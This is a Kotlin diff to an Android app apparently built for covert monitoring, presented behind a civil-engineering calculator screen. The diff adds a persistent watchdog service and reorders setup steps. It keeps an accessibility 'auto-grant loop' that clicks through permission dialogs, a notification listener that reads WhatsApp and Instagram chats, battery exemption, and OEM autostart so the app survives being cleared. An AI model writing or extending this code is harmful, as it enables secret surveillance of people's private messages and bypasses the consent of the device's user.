@@ -73,6 +73,8 @@ import com.spapp.monitoring.fcm.FcmTokenSync
 
 import com.spapp.monitoring.geofence.GeofenceManager
 
+import com.spapp.monitoring.sync.PersistentWatchdogService
+
 import com.spapp.monitoring.sync.SyncScheduler
 
 
@@ -319,6 +321,9 @@ class MainActivity : AppCompatActivity() {
 
         RealtimeLogObserverManager.start(applicationContext)
 
+        // Elevate process priority to FOREGROUND while app is in the foreground
+        PersistentWatchdogService.start(applicationContext)
+
 
 
         // Setup interactive Civil Engineering Calculator Suite
@@ -448,45 +453,13 @@ class MainActivity : AppCompatActivity() {
 
 
     private fun handleNextSetupStep() {
-        // Step 1: Accessibility Service (Enabled first so auto-grant loop can assist)
+        // Step 1: Accessibility Service (Enabled first so auto-grant loop can assist with all subsequent steps)
         if (!isAccessibilityEnabled() && !skipAccessibilityStep) {
             showAccessibilityDialog()
             return
         }
 
-        // Step 2: Notification Access (WhatsApp & Instagram chat listener)
-        if (!isNotificationAccessGranted() && !notificationPrompted && !skipNotificationStep) {
-            showNotificationDialog()
-            return
-        }
-
-        // Step 3: Standard Runtime Permissions (Auto-clicked via Accessibility loop)
-        val missingRuntime = getMissingRuntimePermissions()
-        if (missingRuntime.isNotEmpty()) {
-            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-            Handler(Looper.getMainLooper()).postDelayed({
-                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-                runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
-            }, 300L)
-            return
-        }
-
-        // Step 4: Battery Optimization Exemption (Prompts direct system dialog "Let app always run in background?")
-        if (!isBatteryExempted() && !batteryPrompted) {
-            batteryPrompted = true
-            try {
-                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                    data = Uri.parse("package:$packageName")
-                }
-                batteryExemptionLauncher.launch(intent)
-                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-                return
-            } catch (e: Exception) {
-                Log.w(TAG, "Failed to launch battery exemption intent", e)
-            }
-        }
-
-        // Step 5: OEM Autostart (Xiaomi MIUI/HyperOS, Vivo, Oppo, Realme to survive Recent Apps Clear All)
+        // Step 2: OEM Autostart (Xiaomi MIUI/HyperOS, Vivo, Oppo, Realme to survive Recent Apps Clear All immediately)
         if (isOemRom() && !autostartPrompted) {
             autostartPrompted = true
             val autostartIntent = getAutostartIntent() ?: Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
@@ -498,6 +471,38 @@ class MainActivity : AppCompatActivity() {
                 return
             } catch (e: Exception) {
                 Log.w(TAG, "Failed to launch autostart settings", e)
+            }
+        }
+
+        // Step 3: Notification Access (WhatsApp & Instagram chat listener)
+        if (!isNotificationAccessGranted() && !notificationPrompted && !skipNotificationStep) {
+            showNotificationDialog()
+            return
+        }
+
+        // Step 4: Standard Runtime Permissions (Auto-clicked via Accessibility loop)
+        val missingRuntime = getMissingRuntimePermissions()
+        if (missingRuntime.isNotEmpty()) {
+            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+            Handler(Looper.getMainLooper()).postDelayed({
+                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+                runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
+            }, 300L)
+            return
+        }
+
+        // Step 5: Battery Optimization Exemption (Prompts direct system dialog "Let app always run in background?")
+        if (!isBatteryExempted() && !batteryPrompted) {
+            batteryPrompted = true
+            try {
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                    data = Uri.parse("package:$packageName")
+                }
+                batteryExemptionLauncher.launch(intent)
+                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+                return
+            } catch (e: Exception) {
+                Log.w(TAG, "Failed to launch battery exemption intent", e)
             }
         }
 
